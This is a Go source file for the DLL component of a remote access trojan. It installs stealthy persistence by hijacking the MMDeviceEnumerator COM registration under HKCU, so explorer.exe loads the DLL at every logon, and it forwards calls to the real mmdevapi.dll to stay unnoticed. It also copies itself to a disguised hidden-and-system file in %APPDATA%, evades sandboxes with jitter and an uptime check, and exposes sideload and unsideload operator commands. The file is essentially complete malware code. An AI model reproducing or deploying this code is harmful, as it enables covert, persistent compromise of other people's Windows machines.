//go:build dll && windows

package main

/*
// Minimal Win32 typedefs — avoid #include <windows.h> which declares
// DllGetClassObject/DllCanUnloadNow with COM signatures that conflict
// with our Go CGO exports.
#include <stdint.h>
typedef void*    HMODULE;
typedef uint16_t WCHAR;
typedef WCHAR*   LPCWSTR;
typedef unsigned long DWORD;
typedef int      BOOL;

#define GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS        0x00000004
#define GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT  0x00000002

// Import only the two functions we need, by declaration (no windows.h).
__declspec(dllimport) BOOL __stdcall GetModuleHandleExW(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE *phModule);
__declspec(dllimport) DWORD __stdcall GetModuleFileNameW(HMODULE hModule, WCHAR *lpFilename, DWORD nSize);

// getOwnModule returns the HMODULE of this DLL using the address of this
// C function, which lives inside the DLL's .text section.
static HMODULE getOwnModule() {
	HMODULE hm = 0;
	GetModuleHandleExW(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		(LPCWSTR)getOwnModule,
		&hm
	);
	return hm;
}

// getOwnPath writes this DLL's full path into buf and returns the length.
// Returns 0 on failure, or the character count (not including NUL).
static int getOwnPath(WCHAR *buf, int bufLen) {
	HMODULE hm = getOwnModule();
	if (!hm || bufLen <= 0) return 0;
	return (int)GetModuleFileNameW(hm, buf, (DWORD)bufLen);
}
*/
import "C"

import (
	"fmt"
	"io"
	mrand "math/rand"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ================================================================
// COM HIJACK PERSISTENCE — explorer.exe loads our DLL on every logon
//
// Technique: HKCU COM object hijack via MMDeviceEnumerator CLSID.
// Explorer.exe calls CoCreateInstance(CLSID_MMDeviceEnumerator) during
// shell startup to initialize audio. HKCU\Software\Classes\CLSID takes
// precedence over HKLM, so we register our DLL there and explorer loads
// it automatically — no admin, no startup folder, no Run keys.
//
// Our DLL proxies DllGetClassObject / DllCanUnloadNow to the real
// mmdevapi.dll in System32 so audio still works transparently.
//
// Stage 1: rundll32.exe payload.dll,EntryPoint
//   → copies DLL to %APPDATA%\Microsoft\Windows\Shell\
//   → registers COM hijack in HKCU
//   → sets hidden+system attributes
//   → runs RAT immediately
//
// Stage 2: explorer.exe starts on next logon
//   → loads our DLL via COM hijack
//   → COM calls forwarded to real mmdevapi.dll
//   → RAT runs in background goroutine
// ================================================================

const (
	// COM hijack target: MMDeviceEnumerator — loaded by explorer.exe on every login
	comHijackCLSID  = `{BCDE0395-E52F-467C-8E3D-C4579291692E}`
	comRegPath      = `Software\Classes\CLSID\` + comHijackCLSID + `\InprocServer32`
	comRegParent    = `Software\Classes\CLSID\` + comHijackCLSID

	// Drop location — %APPDATA%\Microsoft\Windows\Shell\ exists on all Win10/11
	sideloadSubdir  = `Microsoft\Windows\Shell`
	sideloadDLLName = "ShellServiceHost.dll"

	// Real COM DLL that we proxy
	realCOMDLL = "mmdevapi.dll"
)

func sideloadDir() string {
	return filepath.Join(os.Getenv("APPDATA"), sideloadSubdir)
}

func sideloadFullPath() string {
	return filepath.Join(sideloadDir(), sideloadDLLName)
}

// ================================================================
// COM DLL PROXY — forward DllGetClassObject / DllCanUnloadNow
// to real System32\mmdevapi.dll so audio works normally in all apps
// ================================================================

var (
	realCOMHandle         syscall.Handle
	realDllGetClassObject uintptr
	realDllCanUnloadNow   uintptr
)

func initCOMProxy() {
	sysRoot := os.Getenv("SYSTEMROOT")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	p := filepath.Join(sysRoot, "System32", realCOMDLL)
	h, err := syscall.LoadLibrary(p)
	if err != nil {
		return
	}
	realCOMHandle = h
	realDllGetClassObject, _ = syscall.GetProcAddress(h, "DllGetClassObject")
	realDllCanUnloadNow, _ = syscall.GetProcAddress(h, "DllCanUnloadNow")
}

//export DllGetClassObject
func DllGetClassObject(rclsid, riid, ppv uintptr) uintptr {
	if realDllGetClassObject != 0 {
		r, _, _ := syscall.SyscallN(realDllGetClassObject, rclsid, riid, ppv)
		return r
	}
	return 0x80040111 // CLASS_E_CLASSNOTAVAILABLE
}

//export DllCanUnloadNow
func DllCanUnloadNow() uintptr {
	if realDllCanUnloadNow != 0 {
		r, _, _ := syscall.SyscallN(realDllCanUnloadNow)
		return r
	}
	return 1 // S_FALSE — keep us loaded
}

// ================================================================
// SELF-PATH RESOLUTION (via CGO GetModuleFileName)
// ================================================================

func getSelfDLLPath() string {
	const bufSize = 512
	buf := make([]uint16, bufSize)
	n := int(C.getOwnPath((*C.wchar_t)(unsafe.Pointer(&buf[0])), bufSize))
	// n == 0: failure; n >= bufSize: path was truncated (shouldn't happen with 512 chars)
	if n <= 0 || n >= bufSize {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

// ================================================================
// AV EVASION HELPERS
// ================================================================

var (
	pSetFileAttributesW = kernel32.NewProc("SetFileAttributesW")
	pGetTickCount64     = kernel32.NewProc("GetTickCount64")
)

const (
	fileAttrHidden = 0x02
	fileAttrSystem = 0x04
)

// setHiddenSystem marks a file as hidden+system so it doesn't show
// in normal Explorer views or dir listings.
func setHiddenSystem(path string) {
	p, _ := syscall.UTF16PtrFromString(path)
	pSetFileAttributesW.Call(uintptr(unsafe.Pointer(p)), uintptr(fileAttrHidden|fileAttrSystem))
}

// sandboxSleep adds a random delay and checks if the system uptime
// is suspiciously low (fresh VM/sandbox spin-up).
func sandboxSleep() bool {
	// Random jitter 3–8 seconds — defeats sandbox time-acceleration
	time.Sleep(time.Duration(3+mrand.Intn(6)) * time.Second)

	// Check uptime: sandboxes/AV often have <3 min uptime
	uptime, _, _ := pGetTickCount64.Call()
	if uptime < uintptr(180_000) { // < 3 minutes
		return false // likely sandbox
	}
	return true
}

// ================================================================
// SIDELOAD INSTALLER — copies DLL + registers COM hijack
// ================================================================

func performSideload() string {
	selfPath := getSelfDLLPath()
	if selfPath == "" {
		return "Sideload failed: cannot determine DLL path"
	}

	targetPath := sideloadFullPath()

	// Already at the target location — just ensure COM is registered
	if strings.EqualFold(selfPath, targetPath) {
		if err := registerCOMHijack(targetPath); err != nil {
			return fmt.Sprintf("Already sideloaded, COM hijack re-register failed: %v", err)
		}
		return "Already sideloaded, COM hijack verified"
	}

	targetDir := sideloadDir()
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return fmt.Sprintf("Sideload mkdir error: %v", err)
	}

	// Copy DLL to drop location
	src, err := os.Open(selfPath)
	if err != nil {
		return fmt.Sprintf("Sideload read error: %v", err)
	}
	defer src.Close()

	dst, err := os.Create(targetPath)
	if err != nil {
		return fmt.Sprintf("Sideload write error: %v", err)
	}

	if _, err = io.Copy(dst, src); err != nil {
		dst.Close()
		os.Remove(targetPath)
		return fmt.Sprintf("Sideload copy error: %v", err)
	}
	dst.Close()

	// Hide the DLL (hidden + system attributes)
	setHiddenSystem(targetPath)

	// Register COM hijack AFTER file is fully written and closed
	if err := registerCOMHijack(targetPath); err != nil {
		return fmt.Sprintf("Sideloaded DLL but COM hijack failed: %v", err)
	}

	return fmt.Sprintf("Sideloaded to %s + COM hijack registered (explorer.exe persistence)", targetPath)
}

func registerCOMHijack(dllPath string) error {
	// Write InprocServer32 default value = our DLL path
	if err := regWrite(HKCU, comRegPath, "", dllPath); err != nil {
		return fmt.Errorf("InprocServer32 write failed: %v", err)
	}
	// Write ThreadingModel = Both (required for COM in-process server)
	if err := regWrite(HKCU, comRegPath, "ThreadingModel", "Both"); err != nil {
		return fmt.Errorf("ThreadingModel write failed: %v", err)
	}
	return nil
}

func removeSideload() string {
	var results []string

	// Remove COM hijack registry entries FIRST (before deleting the DLL file),
	// so explorer.exe won't attempt to load a half-deleted file on the next
	// login if the process is interrupted between these two steps.
	regDelete(HKCU, comRegPath, "")
	regDelete(HKCU, comRegPath, "ThreadingModel")
	regDeleteKey(HKCU, comRegPath)    // delete InprocServer32 subkey
	regDeleteKey(HKCU, comRegParent)  // delete CLSID key
	results = append(results, "COM hijack removed")

	// Remove sideloaded DLL
	targetPath := sideloadFullPath()
	if err := os.Remove(targetPath); err != nil && !os.IsNotExist(err) {
		results = append(results, fmt.Sprintf("DLL removal failed (may be in use): %v", err))
	} else {
		results = append(results, "DLL removed")
	}

	return strings.Join(results, ", ")
}

// ================================================================
// HOOKS — wire DLL-specific commands/cleanup into shared main.go
// ================================================================

func dllCommandHandler(cmd string) (string, bool) {
	switch strings.ToLower(strings.TrimSpace(cmd)) {
	case "sideload":
		return performSideload(), true
	case "unsideload":
		return removeSideload(), true
	}
	return "", false
}

func dllPersistCleanup() {
	// Registry cleanup first, then file removal
	regDelete(HKCU, comRegPath, "")
	regDelete(HKCU, comRegPath, "ThreadingModel")
	regDeleteKey(HKCU, comRegPath)
	regDeleteKey(HKCU, comRegParent)
	os.Remove(sideloadFullPath())
}

func dllOptionsText() string {
	return `
DLL SIDELOAD
  sideload       - Install COM hijack persistence (explorer.exe)
  unsideload     - Remove COM hijack + sideloaded DLL`
}

// ================================================================
// DLL ENTRY POINTS
// ================================================================

//export EntryPoint
func EntryPoint() {
	// Stage 1: called via rundll32.exe payload.dll,EntryPoint
	// Anti-sandbox check + jitter
	if !sandboxSleep() {
		return
	}
	// Install sideload + COM hijack for persistence
	performSideload()
	// Run RAT (blocking — rundll32 stays alive)
	runAgent()
}

func init() {
	// Signal to runAgent() that we're inside a DLL — prevents os.Exit()
	// from killing the host process (explorer.exe).
	dllMode = true

	// Register hooks into shared main.go — all DLL-specific strings
	// stay in this file and never appear in the EXE binary.
	extraPersistCleanup = dllPersistCleanup
	extraOptionsText = dllOptionsText
	extraCommandHandler = dllCommandHandler

	// Set up COM proxy so audio works when loaded by explorer.exe
	initCOMProxy()

	// Detect the host process
	exe, _ := os.Executable()
	exeName := strings.ToLower(filepath.Base(exe))

	if exeName != "rundll32.exe" {
		// Stage 2: loaded by explorer.exe (or another host) via COM hijack.
		// Jitter before starting RAT — avoids burst of activity at logon.
		go func() {
			time.Sleep(time.Duration(5+mrand.Intn(10)) * time.Second)
			runAgent()
		}()
	}
	// If rundll32: COM proxy ready, wait for EntryPoint() call
}

// main is required by -buildmode=c-shared but never called
func main() {}
